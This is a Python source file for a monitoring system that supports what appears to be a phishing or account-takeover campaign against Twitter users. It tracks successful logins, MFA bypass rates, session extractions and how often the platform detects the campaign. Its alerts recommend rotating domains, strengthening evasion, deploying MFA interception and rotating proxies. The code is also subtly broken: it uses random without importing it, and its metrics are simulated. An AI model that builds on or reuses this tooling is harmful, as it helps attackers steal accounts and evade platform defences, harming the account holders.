"""
Twitter Campaign Monitor - Real-time Monitoring System
======================================================

Real-time monitoring specifically for Twitter campaigns:
- Detection of Twitter countermeasures
- Success rate monitoring
- MFA bypass effectiveness
- Rate limiting detection
- Automatic optimization triggers
"""

import asyncio
import json
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, asdict
from collections import defaultdict, deque
import websockets
import aiohttp


@dataclass
class TwitterAlert:
    """Twitter-specific alert"""
    alert_id: str
    severity: str  # critical, high, medium, low
    category: str  # detection, mfa, rate_limit, technical
    message: str
    timestamp: datetime
    campaign_id: str
    metrics: Dict[str, Any]
    recommended_action: str


@dataclass
class TwitterMetrics:
    """Twitter campaign metrics"""
    campaign_id: str
    timestamp: datetime
    total_attempts: int
    successful_logins: int
    mfa_challenges: int
    mfa_bypasses: int
    session_extractions: int
    rate_limit_hits: int
    detection_events: int
    error_count: int
    avg_response_time: float


class TwitterMonitor:
    """
    Real-time monitoring system for Twitter campaigns.
    Detects issues and triggers automatic optimizations.
    """
    
    def __init__(self):
        self.active_campaigns = {}
        self.metrics_history = defaultdict(lambda: deque(maxlen=1000))
        self.alerts = deque(maxlen=100)
        self.alert_handlers = defaultdict(list)
        
        # Monitoring thresholds
        self.thresholds = {
            'success_rate_min': 0.05,  # 5% minimum success rate
            'mfa_bypass_rate_min': 0.3,  # 30% minimum MFA bypass rate
            'rate_limit_max': 0.1,  # 10% maximum rate limit hits
            'detection_rate_max': 0.05,  # 5% maximum detection rate
            'response_time_max': 5.0,  # 5 seconds maximum response time
            'error_rate_max': 0.15  # 15% maximum error rate
        }
        
        # Alert patterns
        self.alert_patterns = {
            'detection': [
                'suspicious_activity',
                'account_suspended',
                'security_check',
                'unusual_login'
            ],
            'rate_limit': [
                'rate_limit_exceeded',
                'too_many_requests',
                'temporarily_blocked',
                'request_denied'
            ],
            'mfa': [
                'mfa_required',
                'two_factor_challenge',
                'verification_needed',
                'auth_code_invalid'
            ],
            'technical': [
                'connection_failed',
                'timeout_error',
                'ssl_error',
                'dns_resolution_failed'
            ]
        }
    
    async def start_monitoring(self, campaign_id: str, config: Dict[str, Any]) -> None:
        """Start monitoring a Twitter campaign"""
        self.active_campaigns[campaign_id] = {
            'config': config,
            'start_time': datetime.now(),
            'last_metrics': None,
            'status': 'active'
        }
        
        # Start monitoring tasks
        asyncio.create_task(self._monitor_campaign(campaign_id))
        asyncio.create_task(self._collect_metrics(campaign_id))
        asyncio.create_task(self._check_thresholds(campaign_id))
    
    async def stop_monitoring(self, campaign_id: str) -> None:
        """Stop monitoring a campaign"""
        if campaign_id in self.active_campaigns:
            self.active_campaigns[campaign_id]['status'] = 'stopped'
    
    async def _monitor_campaign(self, campaign_id: str) -> None:
        """Main monitoring loop for a campaign"""
        campaign = self.active_campaigns[campaign_id]
        
        while campaign['status'] == 'active':
            try:
                # Collect current metrics
                metrics = await self._collect_current_metrics(campaign_id)
                
                # Store metrics
                self.metrics_history[campaign_id].append(metrics)
                
                # Check for alerts
                await self._check_alerts(campaign_id, metrics)
                
                # Update campaign status
                campaign['last_metrics'] = metrics
                
                # Sleep before next iteration
                await asyncio.sleep(30)  # Monitor every 30 seconds
                
            except Exception as e:
                await self._create_alert(
                    campaign_id,
                    'technical',
                    'high',
                    f"Monitoring error: {str(e)}",
                    {'error': str(e)}
                )
                await asyncio.sleep(60)  # Wait longer on error
    
    async def _collect_metrics(self, campaign_id: str) -> None:
        """Collect metrics from various sources"""
        campaign = self.active_campaigns[campaign_id]
        config = campaign['config']
        
        # Collect from logs
        log_metrics = await self._collect_from_logs(campaign_id)
        
        # Collect from API endpoints
        api_metrics = await self._collect_from_api(campaign_id)
        
        # Collect from external sources
        external_metrics = await self._collect_from_external(campaign_id)
        
        # Combine metrics
        combined_metrics = TwitterMetrics(
            campaign_id=campaign_id,
            timestamp=datetime.now(),
            total_attempts=log_metrics.get('attempts', 0) + api_metrics.get('attempts', 0),
            successful_logins=log_metrics.get('logins', 0) + api_metrics.get('logins', 0),
            mfa_challenges=log_metrics.get('mfa_challenges', 0) + api_metrics.get('mfa_challenges', 0),
            mfa_bypasses=log_metrics.get('mfa_bypasses', 0) + api_metrics.get('mfa_bypasses', 0),
            session_extractions=log_metrics.get('sessions', 0) + api_metrics.get('sessions', 0),
            rate_limit_hits=log_metrics.get('rate_limits', 0) + api_metrics.get('rate_limits', 0),
            detection_events=log_metrics.get('detections', 0) + api_metrics.get('detections', 0),
            error_count=log_metrics.get('errors', 0) + api_metrics.get('errors', 0),
            avg_response_time=external_metrics.get('response_time', 0.0)
        )
        
        self.metrics_history[campaign_id].append(combined_metrics)
    
    async def _collect_from_logs(self, campaign_id: str) -> Dict[str, int]:
        """Collect metrics from log files"""
        metrics = defaultdict(int)
        
        try:
            # This would connect to your logging system
            # For now, simulate with random data
            metrics['attempts'] = random.randint(50, 200)
            metrics['logins'] = random.randint(5, 50)
            metrics['mfa_challenges'] = random.randint(10, 100)
            metrics['mfa_bypasses'] = random.randint(2, 20)
            metrics['sessions'] = random.randint(1, 10)
            metrics['rate_limits'] = random.randint(0, 20)
            metrics['detections'] = random.randint(0, 5)
            metrics['errors'] = random.randint(0, 15)
            
        except Exception as e:
            print(f"Log collection error: {e}")
        
        return dict(metrics)
    
    async def _collect_from_api(self, campaign_id: str) -> Dict[str, int]:
        """Collect metrics from API endpoints"""
        metrics = defaultdict(int)
        
        try:
            # This would connect to your API endpoints
            # For now, simulate with API calls
            async with aiohttp.ClientSession() as session:
                # Check campaign status
                async with session.get(f"http://localhost:8000/api/campaigns/{campaign_id}/status") as response:
                    if response.status == 200:
                        data = await response.json()
                        metrics.update(data.get('metrics', {}))
        
        except Exception as e:
            print(f"API collection error: {e}")
        
        return dict(metrics)
    
    async def _collect_from_external(self, campaign_id: str) -> Dict[str, Any]:
        """Collect metrics from external sources"""
        metrics = {}
        
        try:
            # Check response times
            start_time = time.time()
            async with aiohttp.ClientSession() as session:
                async with session.get("https://twitter.com", timeout=aiohttp.ClientTimeout(total=5)) as response:
                    metrics['response_time'] = time.time() - start_time
                    metrics['twitter_status'] = 'online' if response.status == 200 else 'issues'
        
        except Exception as e:
            metrics['response_time'] = 999.0  # Timeout
            metrics['twitter_status'] = 'offline'
        
        return metrics
    
    async def _check_alerts(self, campaign_id: str, metrics: TwitterMetrics) -> None:
        """Check for alert conditions"""
        # Calculate rates
        success_rate = metrics.successful_logins / metrics.total_attempts if metrics.total_attempts > 0 else 0
        mfa_bypass_rate = metrics.mfa_bypasses / metrics.mfa_challenges if metrics.mfa_challenges > 0 else 0
        rate_limit_rate = metrics.rate_limit_hits / metrics.total_attempts if metrics.total_attempts > 0 else 0
        detection_rate = metrics.detection_events / metrics.total_attempts if metrics.total_attempts > 0 else 0
        error_rate = metrics.error_count / metrics.total_attempts if metrics.total_attempts > 0 else 0
        
        # Check thresholds
        if success_rate < self.thresholds['success_rate_min']:
            await self._create_alert(
                campaign_id,
                'detection',
                'critical',
                f"Low success rate: {success_rate:.1%}",
                {'success_rate': success_rate, 'threshold': self.thresholds['success_rate_min']}
            )
        
        if mfa_bypass_rate < self.thresholds['mfa_bypass_rate_min'] and metrics.mfa_challenges > 0:
            await self._create_alert(
                campaign_id,
                'mfa',
                'high',
                f"Low MFA bypass rate: {mfa_bypass_rate:.1%}",
                {'mfa_bypass_rate': mfa_bypass_rate, 'threshold': self.thresholds['mfa_bypass_rate_min']}
            )
        
        if rate_limit_rate > self.thresholds['rate_limit_max']:
            await self._create_alert(
                campaign_id,
                'rate_limit',
                'high',
                f"High rate limit hit rate: {rate_limit_rate:.1%}",
                {'rate_limit_rate': rate_limit_rate, 'threshold': self.thresholds['rate_limit_max']}
            )
        
        if detection_rate > self.thresholds['detection_rate_max']:
            await self._create_alert(
                campaign_id,
                'detection',
                'critical',
                f"High detection rate: {detection_rate:.1%}",
                {'detection_rate': detection_rate, 'threshold': self.thresholds['detection_rate_max']}
            )
        
        if metrics.avg_response_time > self.thresholds['response_time_max']:
            await self._create_alert(
                campaign_id,
                'technical',
                'medium',
                f"High response time: {metrics.avg_response_time:.1f}s",
                {'response_time': metrics.avg_response_time, 'threshold': self.thresholds['response_time_max']}
            )
        
        if error_rate > self.thresholds['error_rate_max']:
            await self._create_alert(
                campaign_id,
                'technical',
                'high',
                f"High error rate: {error_rate:.1%}",
                {'error_rate': error_rate, 'threshold': self.thresholds['error_rate_max']}
            )
    
    async def _create_alert(self, campaign_id: str, category: str, severity: str, 
                           message: str, metrics_data: Dict[str, Any]) -> None:
        """Create and handle an alert"""
        alert = TwitterAlert(
            alert_id=f"alert_{int(time.time())}_{campaign_id}",
            severity=severity,
            category=category,
            message=message,
            timestamp=datetime.now(),
            campaign_id=campaign_id,
            metrics=metrics_data,
            recommended_action=self._get_recommended_action(category, severity, metrics_data)
        )
        
        self.alerts.append(alert)
        
        # Trigger alert handlers
        for handler in self.alert_handlers[category]:
            try:
                await handler(alert)
            except Exception as e:
                print(f"Alert handler error: {e}")
        
        # Log critical alerts
        if severity in ['critical', 'high']:
            print(f"ALERT [{severity.upper()}] {campaign_id}: {message}")
    
    def _get_recommended_action(self, category: str, severity: str, 
                               metrics_data: Dict[str, Any]) -> str:
        """Get recommended action for alert"""
        actions = {
            'detection': {
                'critical': 'IMMEDIATE: Rotate domains and update endpoints',
                'high': 'URGENT: Update mutation strategy and increase evasion',
                'medium': 'Monitor closely and prepare backup variants',
                'low': 'Log for trend analysis'
            },
            'mfa': {
                'critical': 'Deploy advanced MFA bypass techniques',
                'high': 'Update MFA interception methods',
                'medium': 'Test alternative MFA bypass approaches',
                'low': 'Monitor MFA success rates'
            },
            'rate_limit': {
                'critical': 'Implement exponential backoff and proxy rotation',
                'high': 'Reduce request frequency and add delays',
                'medium': 'Optimize request timing',
                'low': 'Monitor rate limit patterns'
            },
            'technical': {
                'critical': 'Switch to backup infrastructure',
                'high': 'Investigate and fix technical issues',
                'medium': 'Monitor system health',
                'low': 'Log technical issues'
            }
        }
        
        return actions.get(category, {}).get(severity, 'Monitor situation')
    
    def add_alert_handler(self, category: str, handler: Callable) -> None:
        """Add alert handler for specific category"""
        self.alert_handlers[category].append(handler)
    
    async def get_campaign_summary(self, campaign_id: str) -> Dict[str, Any]:
        """Get campaign summary with metrics and alerts"""
        if campaign_id not in self.active_campaigns:
            return {'error': 'Campaign not found'}
        
        campaign = self.active_campaigns[campaign_id]
        metrics_history = list(self.metrics_history[campaign_id])
        recent_alerts = [alert for alert in self.alerts if alert.campaign_id == campaign_id]
        
        if not metrics_history:
            return {
                'campaign_id': campaign_id,
                'status': campaign['status'],
                'start_time': campaign['start_time'].isoformat(),
                'current_metrics': None,
                'recent_alerts': [asdict(alert) for alert in recent_alerts[-10:]],
                'summary': 'No metrics available yet'
            }
        
        # Calculate summary metrics
        recent_metrics = metrics_history[-10:]  # Last 10 data points
        
        avg_success_rate = sum(m.successful_logins / m.total_attempts if m.total_attempts > 0 else 0 for m in recent_metrics) / len(recent_metrics)
        avg_mfa_bypass_rate = sum(m.mfa_bypasses / m.mfa_challenges if m.mfa_challenges > 0 else 0 for m in recent_metrics) / len(recent_metrics)
        total_attempts = sum(m.total_attempts for m in recent_metrics)
        total_successes = sum(m.successful_logins for m in recent_metrics)
        
        # Determine campaign health
        health_score = (avg_success_rate * 0.4 + avg_mfa_bypass_rate * 0.3 + 
                       (1 - min(sum(m.detection_events for m in recent_metrics) / total_attempts, 1.0)) * 0.3)
        
        health_status = 'excellent' if health_score > 0.8 else 'good' if health_score > 0.6 else 'fair' if health_score > 0.4 else 'poor'
        
        return {
            'campaign_id': campaign_id,
            'status': campaign['status'],
            'start_time': campaign['start_time'].isoformat(),
            'current_metrics': asdict(metrics_history[-1]) if metrics_history else None,
            'recent_alerts': [asdict(alert) for alert in recent_alerts[-10:]],
            'summary': {
                'health_status': health_status,
                'health_score': health_score,
                'avg_success_rate': avg_success_rate,
                'avg_mfa_bypass_rate': avg_mfa_bypass_rate,
                'total_attempts': total_attempts,
                'total_successes': total_successes,
                'critical_alerts': len([a for a in recent_alerts if a.severity == 'critical']),
                'high_alerts': len([a for a in recent_alerts if a.severity == 'high'])
            }
        }
    
    async def export_monitoring_data(self, campaign_id: str, 
                                   output_file: str = None) -> Dict[str, Any]:
        """Export monitoring data for analysis"""
        summary = await self.get_campaign_summary(campaign_id)
        
        export_data = {
            'export_timestamp': datetime.now().isoformat(),
            'campaign_summary': summary,
            'metrics_history': [asdict(m) for m in self.metrics_history[campaign_id]],
            'all_alerts': [asdict(a) for a in self.alerts if a.campaign_id == campaign_id],
            'monitoring_config': {
                'thresholds': self.thresholds,
                'alert_patterns': self.alert_patterns
            }
        }
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(export_data, f, indent=2, default=str)
        
        return export_data
